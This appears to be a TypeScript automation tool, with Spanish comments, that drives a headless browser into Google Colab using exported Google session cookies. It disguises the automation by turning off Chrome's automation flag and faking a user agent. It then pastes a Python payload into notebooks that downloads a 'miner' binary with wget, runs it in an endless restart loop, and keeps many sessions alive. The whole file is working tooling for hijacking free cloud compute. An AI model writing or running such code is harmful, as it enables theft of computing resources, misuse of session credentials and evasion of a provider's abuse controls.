// tools/provisioner/src/main.ts
// =================================================================
// APARATO: THE NECROMANCER (PROVISIONER v3.0 - GHOST CLOUD)
// CLASIFICACIÓN: OPS / AUTOMATION
// RESPONSABILIDAD: GESTIÓN DE FLOTA Y PROYECCIÓN DE IDENTIDAD
// =================================================================

import { chromium, BrowserContext, Page, Browser } from 'playwright';
import * as path from 'path';
import * as fs from 'fs';
import { z } from 'zod';
import chalk from 'chalk';
import 'dotenv/config';

// -----------------------------------------------------------------
// 1. CONFIGURACIÓN SOBERANA (SSoT)
// -----------------------------------------------------------------
const ConfigSchema = z.object({
  // URLs de Infraestructura
  COLAB_URL: z.string().url().default('https://colab.research.google.com/'),
  ORCHESTRATOR_URL: z.string().url(),

  // Artefacto de Guerra (Binario Rust MUSL)
  MINER_BINARY_URL: z.string().url().default('https://github.com/razpodesta/prospector-btc/releases/latest/download/miner-musl'),

  // Credenciales y Seguridad
  WORKER_AUTH_TOKEN: z.string().min(5),

  // Identidad Portátil (Cookies exportadas)
  // Opción A: Archivo local (cookies.json)
  // Opción B: Variable de entorno Base64 (Para Render/CI)
  GOOGLE_COOKIES_B64: z.string().optional(),

  // Parámetros de la Flota
  WORKER_COUNT: z.string().default('1').transform((val) => parseInt(val, 10)),

  // Configuración del Motor
  HEADLESS: z.string().default('true').transform((val) => val === 'true'),
  CHROME_PROFILE_PATH: z.string().default('./.chrome-profile'),
});

const config = ConfigSchema.parse(process.env);

// -----------------------------------------------------------------
// 2. GESTIÓN DE IDENTIDAD (IDENTITY LOADER)
// -----------------------------------------------------------------
async function loadContextStrategy(): Promise<{ browser: Browser | null, context: BrowserContext }> {
  // ESTRATEGIA A: Cookies en Variable de Entorno (Prioridad Nube)
  if (config.GOOGLE_COOKIES_B64) {
    console.log(chalk.magenta('🔐 Identidad detectada en Variables de Entorno (Base64).'));
    const cookies = JSON.parse(Buffer.from(config.GOOGLE_COOKIES_B64, 'base64').toString('utf-8'));

    const browser = await chromium.launch({
      headless: config.HEADLESS,
      args: ['--disable-blink-features=AutomationControlled', '--no-sandbox']
    });
    const context = await browser.newContext({ userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' });
    await context.addCookies(cookies);
    return { browser, context };
  }

  // ESTRATEGIA B: Archivo Local cookies.json (Prioridad Dev Remoto)
  const cookiePath = path.resolve('cookies.json');
  if (fs.existsSync(cookiePath)) {
    console.log(chalk.blue(`🍪 Identidad detectada en archivo: ${cookiePath}`));
    const cookies = JSON.parse(fs.readFileSync(cookiePath, 'utf-8'));

    const browser = await chromium.launch({
      headless: config.HEADLESS,
      args: ['--disable-blink-features=AutomationControlled', '--no-sandbox']
    });
    const context = await browser.newContext({ userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' });
    await context.addCookies(cookies);
    return { browser, context };
  }

  // ESTRATEGIA C: Perfil Persistente (Legacy / Depuración Local)
  console.log(chalk.yellow('⚠️  Sin identidad portátil. Usando perfil local de Chrome...'));
  const userDataDir = path.resolve(config.CHROME_PROFILE_PATH);
  const context = await chromium.launchPersistentContext(userDataDir, {
    headless: false, // Forzar headful para que el usuario pueda loguearse si falla
    channel: 'chrome',
    viewport: { width: 1280, height: 720 },
    args: ['--disable-blink-features=AutomationControlled']
  });

  return { browser: null, context };
}

// -----------------------------------------------------------------
// 3. PAYLOAD DE INYECCIÓN (PYTHON WRAPPER)
// -----------------------------------------------------------------
const generatePayload = (workerId: number) => `
# --- PROSPECTOR INJECTION START ---
import os
import subprocess
import time
import sys

# Configuración
MINER_URL = "${config.MINER_BINARY_URL}"
ORCH_URL = "${config.ORCHESTRATOR_URL}"
TOKEN = "${config.WORKER_AUTH_TOKEN}"
W_ID = "colab-node-${workerId}-${Date.now()}"

def install_miner():
    if not os.path.exists("miner"):
        print(f"⬇️ [PYTHON] Descargando binario desde {MINER_URL}...")
        # Wget con retries y modo silencioso
        res = subprocess.run(["wget", "-q", "--tries=3", "-O", "miner", MINER_URL])
        if res.returncode != 0:
            print("❌ [PYTHON] Fallo descarga. Abortando.")
            sys.exit(1)
        subprocess.run(["chmod", "+x", "miner"])
        print("✅ [PYTHON] Binario listo.")

def run_miner():
    print(f"🚀 [PYTHON] Iniciando {W_ID} -> {ORCH_URL}")
    cmd = ["./miner", f"--orchestrator-url={ORCH_URL}", f"--auth-token={TOKEN}", f"--worker-id={W_ID}"]

    while True:
        try:
            # Popen para no bloquear el hilo principal de Python
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, bufsize=1
            )
            # Streaming de logs
            for line in process.stdout:
                print(line, end='')

            process.wait()
            print(f"⚠️ [PYTHON] Crash del minero (Code: {process.returncode}). Reinicio en 5s...")
            time.sleep(5)
        except Exception as e:
            print(f"❌ [PYTHON] Error: {e}")
            time.sleep(10)

try:
    install_miner()
    run_miner()
except Exception as e:
    print(f"💀 [PYTHON] Fatal: {e}")
# --- PROSPECTOR INJECTION END ---
`;

// -----------------------------------------------------------------
// 4. LÓGICA TÁCTICA (INTERACCIÓN COLAB)
// -----------------------------------------------------------------
async function wakeUpWorker(id: number, context: BrowserContext) {
  const prefix = chalk.cyan(`[Worker-${id}]`);
  console.log(`${prefix} Iniciando secuencia de despertar...`);

  let page: Page | null = null;

  try {
    page = await context.newPage();

    // A. Navegación Stealth
    await page.goto(config.COLAB_URL, { waitUntil: 'domcontentloaded', timeout: 60000 });

    // B. Verificación de Identidad
    const avatar = page.locator('img[src*="googleusercontent.com"]').first();
    try {
        await avatar.waitFor({ state: 'visible', timeout: 15000 });
    } catch {
        throw new Error("AUTH_FAILED: La identidad cargada no es válida o ha expirado.");
    }

    // C. Conexión al Runtime
    console.log(`${prefix} 🔌 Solicitando recursos (Runtime)...`);
    const connectBtn = page.getByText(/^Connect$|^Reconnect$/i).first();

    if (await connectBtn.isVisible()) {
        await connectBtn.click();
        // Esperar indicador de recursos (RAM/Disk)
        try {
            await page.locator('colab-memory-usage-sparkline').first().waitFor({ state: 'attached', timeout: 40000 });
            console.log(`${prefix} ✅ Runtime Asignado.`);
        } catch {
            console.warn(`${prefix} ⚠️ Advertencia: Runtime tardó en responder, pero continuamos.`);
        }
    }

    // D. Inyección de Payload
    console.log(`${prefix} 💉 Inyectando código minero...`);
    const editor = page.locator('.view-lines').first();
    await editor.click({ force: true });

    await page.keyboard.press('Control+A');
    await page.keyboard.press('Delete');

    const payload = generatePayload(id);
    // Usamos el portapapeles para pegar el código masivamente rápido
    await page.evaluate((text) => navigator.clipboard.writeText(text), payload);
    await page.keyboard.press('Control+V');

    // E. Ejecución
    console.log(`${prefix} ⚡ EJECUTANDO...`);
    await page.keyboard.press('Control+Enter');

    // F. Validación
    try {
        const outputFrame = page.frameLocator('iframe').last();
        const successMsg = outputFrame.getByText('🚀 [PYTHON] Iniciando');
        await successMsg.waitFor({ state: 'visible', timeout: 15000 });
        console.log(chalk.green(`${prefix} ✅ OPERATIVO.`));
    } catch {
        console.log(`${prefix} ⚠️ Ejecutado sin confirmación visual.`);
    }

    // MANTENER VIVO: No cerramos la página.

  } catch (error: any) {
    console.error(chalk.red(`${prefix} ❌ FALLO:`), error.message);
    if (page) {
        const shotPath = path.resolve(`logs/fail-${id}.png`);
        await page.screenshot({ path: shotPath, fullPage: true });
        console.log(`${prefix} 📸 Evidencia guardada en ${shotPath}`);
        await page.close(); // Cerramos página fallida para ahorrar RAM
    }
  }
}

// -----------------------------------------------------------------
// 5. ORQUESTACIÓN PRINCIPAL (EL NIGROMANTE)
// -----------------------------------------------------------------
async function main() {
  console.log(chalk.green.bold(`
   ___  ___  ___  ___  ___  ___  ___  ___  ___
  | _ \\| _ \\| _ \\| __|| _ \\| __|| _ \\| _ \\| _ \\
  |  _/|   /| (_) |__ ||  _/| __||   /|   /|   /
  |_|  |_|_\\ \\___/|___||_|  |___||_|_\\|_|_\\|_|_\\

  >> THE NECROMANCER v3.0 (GHOST CLOUD EDITION) <<
  `));

  const { browser, context } = await loadContextStrategy();

  const totalWorkers = config.WORKER_COUNT;
  const batchSize = 3; // Lotes pequeños para no saturar la CPU del host

  console.log(chalk.white(`🎯 Objetivo: ${totalWorkers} nodos.`));
  console.log(chalk.white(`🛠️  Modo: ${config.HEADLESS ? 'HEADLESS (Invisible)' : 'HEADFUL (Visible)'}`));

  for (let i = 0; i < totalWorkers; i += batchSize) {
      const batchPromises = [];
      for (let j = 0; j < batchSize && (i + j) < totalWorkers; j++) {
          batchPromises.push(wakeUpWorker(i + j, context));
      }

      await Promise.all(batchPromises);

      if (i + batchSize < totalWorkers) {
          console.log(chalk.gray(`⏳ Enfriando API (10s)...`));
          await new Promise(r => setTimeout(r, 10000));
      }
  }

  console.log(chalk.green.bold('\n✨ DESPLIEGUE COMPLETADO.'));
  console.log(chalk.yellow('⚠️  ADVERTENCIA: No detengas este proceso. Mantiene la sesión viva.'));

  // Mantener el proceso vivo indefinidamente
  await new Promise(() => {});
}

main().catch((err) => {
    console.error(chalk.red.bold('💀 ERROR FATAL:'), err);
    process.exit(1);
});
